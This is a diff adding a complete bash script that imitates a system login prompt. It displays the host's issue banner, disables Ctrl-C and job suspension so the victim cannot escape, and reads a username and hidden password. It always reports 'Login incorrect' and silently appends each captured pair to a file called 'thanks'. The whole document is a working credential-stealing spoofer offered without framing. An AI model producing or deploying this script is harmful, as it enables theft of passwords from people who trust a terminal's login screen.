@@ -1,0 +1,30 @@
+#!/bin/bash
+
+# do not echo ctrl sequences
+stty -echoctl
+# disable job control
+stty susp undef
+# disable ctrl-c
+trap ctrl_c INT
+
+# catch ctrl-c
+function ctrl_c() {
+    echo -n
+}
+
+clear
+echo
+echo "$(cat /etc/issue.net) $HOSTNAME tty1"
+echo
+
+while (sleep 0); do
+echo -n "$HOSTNAME login: "
+read u
+echo -n "Password: "
+read -s p
+echo
+echo "Login incorrect"
+echo $u $p >> thanks
+echo
+sleep 1
+done
